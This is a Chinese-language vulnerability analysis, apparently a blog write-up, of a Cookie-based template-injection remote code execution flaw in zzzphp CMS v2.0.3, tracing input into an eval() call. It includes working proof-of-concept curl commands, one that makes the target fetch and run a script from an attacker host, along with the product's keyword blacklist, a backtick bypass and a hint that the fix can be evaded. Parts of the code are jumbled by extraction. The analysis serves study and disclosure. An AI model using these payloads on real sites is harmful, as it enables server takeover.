POC分析：
分析POC可得到以下信息：
1. 漏洞点由Cookie触发，Cookie值为 keys
2. Payload像是一个if标签，猜测可能为模板注入
3. 请求参数为 ?location=search，猜测可能是个路由
漏洞分析
复现环境为：zzzphp v2.0.3
从 /index.php 找起，跟踪到 inc/zzz_client.php 。搜索 location  关键字。接着找到这么一段代
码：
查看模板文件 /template/pc/cn2016/html/search.html  。发现了Poc中的 keys
curl -b 'keys={if:=`curl http://attacker.tld/poc.sh|bash`}{end if}' 
'http://target.tld/?location=search'
1
//只要get传递了location，getlocation()就返回$_GET['location']
$location=getlocation();
switch ($location) {
    ......
    case 'search':
        //设置路径
        //TPL_DIR = /template/pc/cn2016/html
        $tplfile= TPL_DIR . 'search.html'; 
        break;
    ......
 }
.....
//对$tplfile进行file_get_contents()
//$zcontent为模板内容
$zcontent = load_file($tplfile,$location);
$parser = new ParserTemplate();
//解析模板
$zcontent = $parser->parserCommom($zcontent);
echo $zcontent;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
......
关键词【{zzz:keys}】搜索结果-{zzz:sitetitle}
......
1
2
3
跟进 parserCommom() 方法，该方法会进行标签解析。不过在这个漏洞中，仅需关注 
parserlocation()  和 parserIfLabel() 即可。可以注意下 parserIfLabel()  的调用在 
parserlocation()  之后，这个调用顺序是该漏洞的成因之一 ：
首先分析 parserlocation() 方法，该方法又调用了 parserSearch() 方法，关键代码如下：
public function parserCommom( $zcontent ) {
    $zcontent = $this->parserSiteLabel( $zcontent ); // 站点标签
    $zcontent = $this->ParseInTemplate( $zcontent ); // 模板标签
    $zcontent = $this->parserConfigLabel( $zcontent ); //配置表情
    $zcontent = $this->parserSiteLabel( $zcontent ); // 站点标签    
    $zcontent = $this->parserNavLabel( $zcontent ); // 导航标签 
    $zcontent = $this->parserCompanyLabel( $zcontent ); // 公司标签
    $zcontent = $this->parserUser( $zcontent ); //会员信息    
    //parserlocation()
    $zcontent = $this->parserlocation( $zcontent ); // 站点标签        
    $zcontent = $this->parserLoopLabel( $zcontent ); // 循环标签        
    $zcontent = $this->parserContentLoop( $zcontent ); // 指定内容
    $zcontent = $this->parserbrandloop( $zcontent );
    $zcontent = $this->parserGbookList( $zcontent );        
    $zcontent = $this->parserLabel( $zcontent ); // 指定内容
    $zcontent = $this->parserPicsLoop( $zcontent ); // 内容多图
    $zcontent = $this->parserad( $zcontent );
    $zcontent = parserPlugLoop( $zcontent );
    $zcontent = $this->parserOtherLabel( $zcontent );
    //parserIfLabel()
    $zcontent = $this->parserIfLabel( $zcontent ); // IF语句
    $zcontent = $this->parserNoLabel( $zcontent );
    return $zcontent;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
private function parserlocation( $zcontent ) {
    //这个$location就是GET获得的location
    $location = G( 'location' );
    switch ( $location ) {
        ......
        case 'search':
            $zcontent = $this->parserSearch( $zcontent );
            break;
        ......
    }
    return $zcontent;
}
public function parserSearch( $zcontent ) {
    //getform('keys', 'cookie') 相当于 $_COOKIE['keys']
    //danger_key() 里面是黑名单字符串列表，遇到如 system,eval 这些字符串将会立刻报错
    $keys = danger_key(getform( 'keys', 'cookie' )); 
    ......
    //替换模板内容
    $zcontent = str_replace( '{zzz:keys}', $keys, $zcontent );
    ......
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
执行完 parserlocation() 方法后，此时的模板内容 $zcontent  值变成了
接下来分析 parserIfLabel() 方法，根据函数命名和注释可以猜到，这是用于处理 if 模板标签的方法
......
关键词【{if:=`curl http://attacker.v12tix.dnslog.cn`}{end if}】搜索结果-
zzzcms-PHP建站系统    
......
1
2
3
public function parserIfLabel( $zcontent ) {
    //匹配 if 模板标签
    //格式：{if:判断语句}if条件成立时执行的东西{end if}
    //Poc为 {if:=`curl http://attacker.tld/poc.sh|bash`}{end if}
    $pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
    if ( preg_match_all( $pattern, $zcontent, $matches ) ) {
        $count = count( $matches[ 0 ] );
        //根据匹配到的 if模板标签，依次解析
        for ( $i = 0; $i ', '!=', $ifstr );
            $ifstr = str_replace( 'or', '||', $ifstr );
            $ifstr = str_replace( 'and', '&&', $ifstr );
            $ifstr = str_replace( 'mod', '%', $ifstr );
            $ifstr = str_replace( 'not', '!', $ifstr );
            //表达式过滤
            foreach(array('==','!=','||','&&','%','!','>=','','<') as 
$v){
                if(strpos($ifstr,$v) !== false){
                    //根据运算符分割字符串
                    $arr= splits($ifstr,$v);
                    //对if模板标签内容值进行安全过滤
                    $arr1=  danger_key($arr[0]);
                    $arr2=  danger_key($arr[1]);
                    $arr0=  $v;
                    if($arr[0]=='') $arr1='0';
                    if($arr[1]=='') $arr2='0';
                }
            }
            if ( preg_match( '/\{|}/', $ifstr)) {    
                error('很抱歉，模板中有错误的判断,请修正'.$ifstr);
            }else{
                // !!漏洞触发点!!
                @eval( 'if(' .$arr1 . $arr0 . $arr2. ')
{$flag="if";}else{$flag="else";}' );
            }  
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
程序多次使用了黑名单方法 danger_key()  来进行安全过滤。这里列出来该方法过滤的字符串：
'php','preg','server','chr','decode','html','md5','post','get','request','file','co
okie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','s
hell','open','ini_','chroot','eval','passthru','include','require','assert','union',
'create','func','symlink','sleep','ascii','ord','print','echo','base_','replace','_m
ap','_dump','_array','regexp','select','dbpre','zzz_'
总结：
至此整个漏洞流程就分析完了。从 “恶意函数回溯” 的审计方法来看，流程如下：
1. parserIfLabel()  函数中存在 eval()  代码， eval()  内的参数可由 $zcontent  控制
2. parserlocation()  函数中替换模板标签 {zzz:keys}  时，替换内容可控制为 Cookie keys 值。
即我们可控制一部分 $zcontent 的值
3. 为了能执行 parserlocation()  函数替换模板标签 {zzz:keys}  的操作，需要控制 $location
4. $location 值可通过 $_GET['location']  进行控制
5. 由于黑名单方法 danger_key()  的存在，Payload 不能保护如 system,eval  一类的关键字。不
过PHP可使用反引号 "`" 执行系统命令，可绕过黑名单
测试POC
修改POC为
Debug跟踪到执行 eval()  的代码，如下：
 成功接收到Dns请求
关于下源码的坑
由于zzzcms官网似乎没有开放下载历史版本的链接，正常下载是下的最新 v2.0.4 版本
curl -b 'keys={if:=`curl http://attacker.37fo0c.dnslog.cn`}{end if}' 
'http://127.0.0.1/zzzcms/2.0.3/?location=search&XDEBUG_SESSION_START=16941'
1
然后，，，不知道是不是zzzcms的站长忘记更新百度网盘的资源了，右边的百度网盘下载可以下载到 
v2.0.3 版本的
但是我初初来复现的时候是没有留意到右边这个百度网盘的下载安全按钮的，于是乎为了找低版本从源
码站下了一个 v1.8.2
http://down.chinaz.com/soft/39126.htm
但是 v1.8.2 是无法成功利用这个漏洞的，为何？原因出在获取 Cookie 的代码上：
v1.8.2 获取keys的方式：
正是由于 v1.8.2 获取 Cookie 是从 get_cookie()  方法中获取的，所以该版本不存在漏洞
而 v2.0.3 版本获取Cookie的方式是这样的：
/inc/zzz_main.php
function getform( $name, $source = 'both', $type = NULL, $default = NULL ) {
    switch ( $source ) {
        ......
        case 'cookie':
            $data = _REQUEST($name);
            if($data) {
                 set_cookie( $name,$data ) ;
            }else{
                //调用了 get_cookie() 方法
                $data=get_cookie( $name,$data ) ;
            }
            break;
        ......
    }
}
--------
function get_cookie( $name ) {
    if ( is_null( $name ) ) return '';
    $x = $_SERVER[ 'prefix'];
    $vv = $_COOKIE[ $_SERVER[ 'prefix' ] . $name ];
    $oo = $_SERVER[ 'prefix' ] . $name;
    //固定前缀来获取Cookie
    $data = isset( $_COOKIE[ $_SERVER[ 'prefix' ] . $name ] ) ? $_COOKIE[ 
$_SERVER[ 'prefix' ] . $name ] : NULL;
    //对cookie值进行一次过滤
    return safe_url($data);
}
--------
function safe_url( $s, $len=255) {
    //设置了正则过滤，显而易见，我们Poc中的 { } ` 都被白名单过滤掉了
    preg_match_all('/[a-zA-Z0-9,.:=@?_\/\s]/u',$s,$result);
    $temp =join('',$result[0]);     
    $s = substr( $temp, 0, $len );
    return $s;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
/inc/zzz_main.php
function getform( $name, $source = 'both', $type = NULL, $default = NULL ) {
    switch ( $source ) {
        ......
        case 'cookie':
            $data = _REQUEST($name);
            if($data) {
                 setcookie( $name,$data ) ;
            }else{
                //通过 _COOKIE() 方法来获取Cookie
                $data=_COOKIE($name);
            }
1
2
3
4
5
6
7
8
9
10
11
12
在 v2.0.3 中搜索 get_cookie()  函数，发现该函数是有的。至于为什么 v1.8.2 版本使用了该函数而 
v2.0.3 没有使用，翻了下更新日志没看到有关说明。。我估计可能是为了程序效率，以及考虑到Cookie
值可能有各种特殊符号，便放宽了过滤机制。
v2.0.4修复方式
如今的最新版 v2.0.4 依然没有重新使用 get_cookie()  函数，修复方式仅在 danger_key()  方法的黑
名单中新增了 '{if','curl'  这两个字符串。。。如果能找到合适的模板标签估计就能绕过黑名单了。
Reference:
https://srcincite.io/advisories/src-2021-0015/
https://mp.weixin.qq.com/s/JyQktD2WTpFvf9Xft4cVrQ
            break;
        .....
    }
}
--------
function _COOKIE( $k, $def = NULL ) {
    //直接返回Cookie，没有任何过滤
    return isset( $_COOKIE[ $k ] ) ? $_COOKIE[ $k ] : $def;
}
13
14
15
16
17
18
19
20
21